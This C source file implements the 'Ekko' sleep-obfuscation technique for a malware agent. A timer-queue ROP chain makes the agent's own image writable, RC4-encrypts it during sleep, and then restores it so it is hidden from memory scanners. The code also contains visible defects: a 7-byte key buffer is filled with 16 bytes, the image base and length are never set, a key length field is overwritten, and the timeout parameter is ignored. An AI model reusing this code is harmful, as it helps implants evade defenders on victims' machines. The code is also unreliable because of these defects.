/*!
 * @brief
 *  Performs sleep obfuscation using the ekko technique
 * 
 * @param Delay
 */
VOID EkkoEx(
    IN DWORD TimeOut
) {
    NTSTATUS NtStatus  = STATUS_SUCCESS;
    USTRING  Key       = { 0 };
    USTRING  Img       = { 0 };
    BYTE     Rnd[ 7 ]  = { 0 };
    CONTEXT  Rop[ 10 ] = { 0 };
    CONTEXT  RopInit   = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntEnd   = { 0 };
    HANDLE   Queue     = { 0 };
    HANDLE   Timer     = { 0 };
    DWORD    Delay     = { 0 };
    DWORD    Value     = { 0 };

    /* image base and size */
    PVOID ImageBase = NULL;
    ULONG ImageLen  = 0;

    /* generate a new key */
    for ( int i = 0; i < 16; i++ ) {
        Rnd[ i ] = RandomNumber32( Instance );
    }



    /* set key buffer and size */
    Key.Buffer = Rnd;
    Key.Length = Key.MaximumLength = sizeof( Rnd );

    /* set image pointer and size */
    Img.Buffer = ImageBase;                    /* address of your agent */
    Img.Length = Key.MaximumLength = ImageLen; /* size of agent memory */

    /* create a timer queue */
    if ( ! NT_SUCCESS( RtlCreateTimerQueue( &Queue ) ) ) {
        goto LEAVE;
    }

    /* create events for starting the rop chain and waiting for the rop chain to finish */
    if ( ! NT_SUCCESS( NtStatus = NtCreateEvent( &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ||
         ! NT_SUCCESS( NtStatus = NtCreateEvent( &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ||
         ! NT_SUCCESS( NtStatus = NtCreateEvent( &EvntEnd,   EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
    {
        goto LEAVE;
    }

    /* let's start the rop part of this operation/sleep obf */
    if ( NT_SUCCESS( NtStatus = RtlCreateTimer( Queue, &Timer, RtlCaptureContext, &RopInit, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) )
    {
        /* wait til we successfully finished calling RtlCaptureContext */
        if ( NT_SUCCESS( NtStatus = RtlCreateTimer( Queue, &Timer, NtSetEvent, EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) )
        {
            /* wait til we successfully retrieved the timers thread context */
            if ( ! NT_SUCCESS( NtStatus = WaitForSingleObjectEx( EvntTimer, 1000, FALSE ) ) ) { /* we only wait for a second... */
                goto LEAVE;
            }

            /* at this point we can start preparing the ROPs and execute the timers */
            for ( int i = 0; i < 7; i++ ) {
                MemCopy( &Rop[ i ], &RopInit, sizeof( CONTEXT ) );
                Rop[ i ].Rsp -= sizeof( PVOID );
            }

            /* Start of Ropchain */
            Rop[ 0 ].Rip = U_PTR( WaitForSingleObjectEx );
            Rop[ 0 ].Rcx = U_PTR( EvntStart );
            Rop[ 0 ].Rdx = U_PTR( INFINITE );
            Rop[ 0 ].R8  = U_PTR( NULL );

            /* Protect */
            Rop[ 1 ].Rip = U_PTR( VirtualProtect );
            Rop[ 1 ].Rcx = U_PTR( ImageBase );
            Rop[ 1 ].Rdx = U_PTR( ImageLen  );
            Rop[ 1 ].R8  = U_PTR( PAGE_READWRITE );
            Rop[ 1 ].R9  = U_PTR( &Value );

            /* Encrypt image base address */
            Rop[ 2 ].Rip = U_PTR( SystemFunction032 );
            Rop[ 2 ].Rcx = U_PTR( &Img );
            Rop[ 2 ].Rdx = U_PTR( &Key );

            /* Sleep    */
            Rop[ 3 ].Rip = U_PTR( WaitForSingleObjectEx );
            Rop[ 3 ].Rcx = U_PTR( NtCurrentProcess() );
            Rop[ 3 ].Rdx = U_PTR( Delay );
            Rop[ 3 ].R8  = U_PTR( FALSE );

            /* Sys032   */
            Rop[ 4 ].Rip = U_PTR( SystemFunction032 );
            Rop[ 4 ].Rcx = U_PTR( &Img );
            Rop[ 4 ].Rdx = U_PTR( &Key );

            /* Protect  */
            Rop[ 5 ].Rip = U_PTR( VirtualProtect );
            Rop[ 5 ].Rcx = U_PTR( ImageBase );
            Rop[ 5 ].Rdx = U_PTR( ImageLen  );
            Rop[ 5 ].R8  = U_PTR( PAGE_EXECUTE_READ );
            Rop[ 5 ].R9  = U_PTR( &Value );

            /* End of Ropchain */
            Rop[ 6 ].Rip = U_PTR( NtSetEvent );
            Rop[ 6 ].Rcx = U_PTR( EvntEnd );
            Rop[ 6 ].Rdx = U_PTR( NULL );

            /* execute timers */
            for ( int i = 0; i < 7; i++ ) {
                if ( ! NT_SUCCESS( RtlCreateTimer( Queue, &Timer, NtContinue, &Rop[ i ], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                    goto LEAVE;
                }
            }

            /* trigger/start the rop chain and wait for it to end */
            if ( ! NT_SUCCESS( NtSignalAndWaitForSingleObject( EvntStart, EvntEnd, FALSE, NULL ) ) ) {
                goto LEAVE;
            }
        }
    }

LEAVE:
    if ( Queue ) {
        NtClose( Queue );
    }

    if ( EvntTimer ) {
        NtClose( EvntTimer );
    }

    if ( EvntStart ) {
        NtClose( EvntStart );
    }

    if ( EvntEnd ) {
        NtClose( EvntEnd );
    }
}